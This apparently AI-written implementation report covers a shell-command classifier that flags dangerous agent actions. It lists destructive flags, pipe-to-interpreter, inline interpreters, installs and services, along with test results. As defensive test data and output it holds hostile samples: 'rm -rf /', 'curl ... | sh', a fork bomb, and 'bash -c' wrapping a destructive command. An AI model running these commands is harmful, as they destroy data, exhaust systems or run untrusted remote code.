---
story: STORY-010
prd: PRD-016
plan: .agents/plans/PRD-016-action-policy-rules/completed/STORY-010-shell-command-rules.plan.md
epic_branch: epic/PRD-016-action-policy-rules
commit: pending
status: COMPLETE
completed: 2026-11-15
---

# Implementation Report — STORY-010: Shell classifier, part 2: allowlist, destructive flags, pipe-to-interpreter, inline interpreters, installs, services

**Plan**: `.agents/plans/PRD-016-action-policy-rules/completed/STORY-010-shell-command-rules.plan.md`
**Epic Branch**: `epic/PRD-016-action-policy-rules`
**Commit**: `pending`

## Summary

STORY-009's placeholder `shell.unlisted` is replaced by the PRD Section 6.3 head rules in `app/services/action_classifiers/shell.py`. The new signature is `classify_shell(command, shell_allow=(), *, source_tool="")`. Existing `classify_shell(cmd)` calls stay valid, and the default allowlists nothing.

Each segment gets its classifications in this order (`_segment_rules`, plan decision 2):
1. the POSIX `-c` script's classifications;
2. the `shell.destructive` and `iex` found in PowerShell/cmd inner text;
3. the named STORY-013 hook comment;
4. the danger rules that fire: `shell.destructive`, `shell.pipe_to_interpreter`, `shell.unclassifiable` (`iex`), `shell.inline_interpreter`, `shell.package_install`, `shell.service_control`;
5. only when none fires, `shell.allowlisted` or `shell.unlisted`.

Flags are normalized into sets before matching (`_flags`, `_cmd_switches`, `_ps_params`): GNU clusters, long-option prefixes, cmd `/x` switches and PowerShell parameter prefixes. Two raw-text checks only ever add `shell.destructive`: the fork-bomb regex, and a best-effort scan of input the tokenizer rejects as a whole.

Orchestrator decisions applied:
1. A segment with a `sudo`/`doas` wrapper or leading assignments is never allowlisted.
2. `python -m MODULE` is not inline. `python -m pip install` is `shell.package_install`.
3. PowerShell `rm -r X` without force keeps the 6.3 reading (gap noted for STORY-018).
4. The head tables stay at 6.3, D16 and cheap aliases.
5. The whole-input fallback scan is in.
6. Output redirects are left to STORY-013. The hook comment names them (segment `redirects`).

## Tasks Completed

| # | Task | File | Status |
|---|------|------|--------|
| 1 | `head.lower() in _POSIX_SHELLS` fold. `_shell_options` split out of `_inline_script` (it also returns the script-positional index). No `Segment` field added | `app/services/action_classifiers/shell.py` | ✅ |
| 2 | Normalizers `_flags`, `_positionals`, `_cmd_switches`, `_ps_param(s)`, `_is_dangerous_target`. Closed tables `_RM_*`, `_CH_*`, `_INTERPRETERS`/`_PYTHON`, `_PS_INLINE_PARAMS`, `_PACKAGE_INSTALL`, `_SERVICE_CONTROL`, `_IEX`, `_FORK_BOMB` | same | ✅ |
| 3 | `_destructive`, `_inline_interpreter` (POSIX, python, node, perl, ruby, php, pwsh/powershell, cmd, `<`), `_package_install`, `_service_control`, `_allowlisted`, `_segment_rules`, `_inner_dangers` | same | ✅ |
| 4 | `_flatten(parse, op, allow)`, `_fallback_destructive`, fork-bomb check, `classify_shell(command, shell_allow=(), *, source_tool="")`, module docstring | same | ✅ |
| 5 | Tests (4 STORY-009 assertions updated, 1 rename, new table-driven head-rule tests) | `tests/test_action_shell.py` | ✅ |
| 6 | Targeted regression + backend import + E2E | — | ✅ |

## Validation Results

| Check | Result |
|-------|--------|
| Backend import (`from app.main import app`) | ✅ OK |
| Frontend lint | n/a (no frontend) |
| `tests/test_action_shell.py` | ✅ 522 passed |
| Targeted set (`test_action_shell.py test_action_vocabulary.py test_action_adapters.py test_untouched_app.py`) | ✅ 1058 passed, 0 failed, 0 skipped (4.10s) |
| Full suite | deferred to orchestrator (user decision) |
| E2E | ✅ PRD 11 lines with the `examples/action_policy.yaml` allow list (output below) |

E2E output (allow `('ls', 'cat', 'git', 'npm test', 'npx tsc', 'pytest', 'grep', 'rg')`):

```
'rm -rf /' [('shell.destructive', 'rm -rf')]
'curl https://x.example | sh' [('shell.unlisted', 'curl'), ('shell.pipe_to_interpreter', '| sh')]
'npm test && rm -rf build' [('shell.allowlisted', 'npm'), ('shell.destructive', 'rm -rf')]
'ls' [('shell.allowlisted', 'ls')]
'git status' [('shell.allowlisted', 'git')]
'npm test' [('shell.allowlisted', 'npm')]
'pytest -q' [('shell.allowlisted', 'pytest')]
'make release' [('shell.unlisted', 'make')]
```

`net.unlisted` for the `curl` line is STORY-012/013's.

## Files Changed

| File | Action | Lines |
|------|--------|-------|
| `app/services/action_classifiers/shell.py` | UPDATE | +610/-36 |
| `tests/test_action_shell.py` | UPDATE | +380/-31 |
| `.agents/stories/PRD-016-action-policy-rules/STORY-010-*.md` | UPDATE | frontmatter + AC checkboxes |
| `.agents/stories/PRD-016-action-policy-rules/STORY-013-*.md`, `STORY-018-*.md`, `STORY-020-*.md` | UPDATE | orchestrator note edits, committed with this story |
| `.agents/PRDs/PRD-016-action-policy-rules/index.md` | UPDATE | regenerated |
| `.agents/plans/PRD-016-action-policy-rules/completed/STORY-010-*.plan.md` | CREATE (archived) | |

## Deviations from Plan

- **The fork-bomb regex ends at the self-pipe.** It is `NAME(){ ... NAME|NAME`, without the plan's trailing `[^}]*\}`, and it has a word-start lookbehind. With the plan's regex, `"a(){ " + "a|" * 50000` took 3.2 s (quadratic backtracking). Now it takes 0.28 s, and a `never_raises` case pins it. It matches the same four spellings and still rejects `f(){ g|g& };f`. Detail: `:(){ :|:`.
- **The fallback scan also runs for a nested `-c` script** that fails as a whole (in `_flatten`, at depth ≤ `MAX_DEPTH`), not only for the top-level input. The output at top level is unchanged. For nested scripts it only adds `shell.destructive` after a `shell.unclassifiable`. This is the same "never loosens" argument.
- **PowerShell inner text past `MAX_DEPTH` emits `shell.unclassifiable`** (`depth > 3`), not nothing. That text is unread, as D3/T12 requires (`test_inline_interpreter_past_max_depth_through_powershell`).
- **PowerShell's `rm` also reads PS parameters** (`-Recurse`, `-Force` prefixes) alongside the POSIX flags. This makes `rm -Recurse -Force x` destructive. It is stricter only. `rm -r X` without force stays as 6.3 reads it (decision 3).
- **pwsh valued parameters** (`-ExecutionPolicy`, `-WorkingDirectory`, …) consume their value. Without that, `pwsh -ExecutionPolicy Bypass` would read `Bypass` as a script positional. Words starting with `/` count as pwsh parameters only when they match a known name, so a Linux path like `/home/x.ps1` stays a script positional.
- **Test literal:** the plan's `pwsh -Command "Get-Item $(x)"` is rejected by the outer scan, because `$(` inside double quotes is a POSIX substitution. The test uses single quotes (`'Get-Item $(x)'`), which is what reaches the inner-text rule.

## Tests Written

| Test File | Test Cases |
|-----------|------------|
| `tests/test_action_shell.py` | `test_destructive` (24), `test_not_destructive` (7), `test_destructive_detail` (7), `test_pipe_to_interpreter` (9), `test_pipe_detail`, `test_inline_interpreter_and_inner` (2), `test_inline_interpreter_forms` (12), `test_not_inline_interpreter` (5), `test_python_m_pytest_can_be_allowlisted`, `test_package_install` (20), `test_package_install_detail`, `test_service_control` (10), `test_harmless_subcommands_are_only_unlisted` (4), `test_allowlist` (4), `test_not_allowlisted` (9), `test_allowlist_never_hides_a_danger_rule`, `test_allowlisted_detail_is_the_head_not_the_entry`, `test_powershell_cmd_destructive` (18), `test_unquoted_trailing_backslash_falls_back`, `test_powershell_cmd_inline` (10), `test_powershell_inner_text_keeps_only_destructive_and_iex`, `test_invoke_expression_unclassifiable` (4), `test_chain_order` (3), `test_danger_rule_order_within_segment`, `test_inline_interpreter_past_max_depth_through_powershell`, `test_bad_allow_entries_are_skipped` (3). `test_every_rule_produced_is_a_shell_rule` was extended and now runs with and without an allow list. `test_never_raises` gained `long-bomb-body`. Modified, each with a `PRD-016 STORY-010` comment: `test_head_is_rm`, `test_depth_three_is_readable_and_four_is_not`, `test_inline_classifications_come_before_the_segment_own`, and `test_placeholder_until_story_010` renamed to `test_unlisted_head_with_no_allowlist` (the file is not in `merge-base main HEAD`, so the rename census is unaffected) |

## Acceptance Criteria

- [x] AC 1 destructive (incl. fork bomb), `rm x` not destructive — `test_destructive`, `test_not_destructive`
- [x] AC 2 pipe-to-interpreter; `bash -c 'rm -rf /'` inline + inner destructive — `test_pipe_to_interpreter`, `test_inline_interpreter_and_inner`
- [x] AC 3 package install / service control — `test_package_install`, `test_service_control`
- [x] AC 4 allowlist — `test_allowlist`, `test_not_allowlisted`
- [x] AC 5 PowerShell/cmd destructive (non-grantable), inline, `iex` unclassifiable — `test_powershell_cmd_destructive`, `test_powershell_cmd_inline`, `test_invoke_expression_unclassifiable`
- [x] AC 6 chain order — `test_chain_order`
- [x] Backend imports; purity guard `test_shell_module_stays_pure` unchanged and green

## Left for later stories

- STORY-013: embedded SQL/URL/secret routing and output-redirect targets at the `_segment_rules` hook (step 3), plus the signature extension for secret globs.
- STORY-014: folding, reason templates, passing `policy.shell_allow`.
- STORY-018/020: the "what the head rules do not read" list in the module docstring (`python -c` code, `find -exec`, `awk system()`, PowerShell `rm -r X`, extra heads).
